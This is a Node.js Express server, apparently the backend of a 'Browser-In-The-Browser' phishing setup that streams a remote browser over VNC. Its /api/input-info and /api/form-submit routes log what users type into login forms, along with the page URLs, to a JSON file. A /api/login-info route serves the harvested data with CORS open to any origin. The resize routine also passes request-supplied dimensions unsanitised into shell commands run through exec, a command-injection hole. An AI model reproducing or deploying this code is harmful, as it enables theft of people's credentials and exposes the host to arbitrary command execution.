const express = require('express');
const cors = require('cors');
const { exec } = require('child_process');  // Added this line
const { promisify } = require('util');
const execAsync = promisify(exec);
const fs = require('fs');
const path = require('path');
const app = express();

// Configure CORS
app.use(cors({
    origin: '*',
    methods: ['POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// Constants
const displayName = 'VNC-0';
const CONFIG_DIR = '/home/ubuntu/Browser-In-The-Browser/automation';
const loginInfoPath = path.join(CONFIG_DIR, 'login_info.json');
const sizeConfigPath = path.join(CONFIG_DIR, 'size_config.json');

// Ensure config directory exists
if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true });
}

// Resize handler
const ResizeHandler = {
    queue: [],
    processing: false,

    async processQueue() {
        if (this.processing || this.queue.length === 0) return;
        
        this.processing = true;
        const { width, height } = this.queue.pop();
        this.queue = []; // Clear queue since we're using latest dimensions
        
        try {
            // Save size configuration
            fs.writeFileSync(sizeConfigPath, JSON.stringify({ width, height }, null, 2));
            console.log('Size config saved:', { width, height });

            // Update display resolution
            const xrandrCmd = `DISPLAY=:1 xrandr --output ${displayName} --fb ${width}x${height}`;
            await execAsync(xrandrCmd);
            console.log('Display resolution updated');

            // Update window size
            const wmCommands = [
                `DISPLAY=:1 wmctrl -r :ACTIVE: -b remove,fullscreen`,
                `DISPLAY=:1 wmctrl -r :ACTIVE: -e 0,0,0,${width},${height}`,
                `DISPLAY=:1 wmctrl -r :ACTIVE: -b add,fullscreen`
            ];

            for (const cmd of wmCommands) {
                try {
                    await execAsync(cmd);
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (err) {
                    console.error('Window management command failed:', err);
                }
            }
        } catch (error) {
            console.error('Resize operation failed:', error);
        } finally {
            this.processing = false;
            if (this.queue.length > 0) {
                setTimeout(() => this.processQueue(), 100);
            }
        }
    },

    addToQueue(dimensions) {
        this.queue.push(dimensions);
        this.processQueue();
    }
};

// Save login information
function saveLoginInfo(info) {
    try {
        let data = [];
        if (fs.existsSync(loginInfoPath)) {
            data = JSON.parse(fs.readFileSync(loginInfoPath, 'utf8'));
        }
        data.push({
            ...info,
            timestamp: new Date().toISOString()
        });
        fs.writeFileSync(loginInfoPath, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Error saving login info:', error);
    }
}

// API Routes
app.post('/api/browser-info', (req, res) => {
    const { width, height } = req.body;
    if (!width || !height || width < 100 || height < 100) {
        return res.status(400).json({ error: 'Invalid dimensions' });
    }
    
    ResizeHandler.addToQueue({ width, height });
    res.json({ success: true });
});

app.post('/api/input-info', (req, res) => {
    const { type, value, url } = req.body;
    saveLoginInfo({ type, value, url });
    res.json({ success: true });
});

app.post('/api/form-submit', (req, res) => {
    const { inputs, url } = req.body;
    saveLoginInfo({ inputs, url });
    res.json({ success: true });
});

app.get('/api/login-info', (req, res) => {
    try {
        if (fs.existsSync(loginInfoPath)) {
            const data = fs.readFileSync(loginInfoPath, 'utf8');
            res.json(JSON.parse(data));
        } else {
            res.json([]);
        }
    } catch (error) {
        res.status(500).json({ error: 'Error reading login info' });
    }
});

// Start server
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log('Login info will be saved to:', loginInfoPath);
    console.log('Size config will be saved to:', sizeConfigPath);
});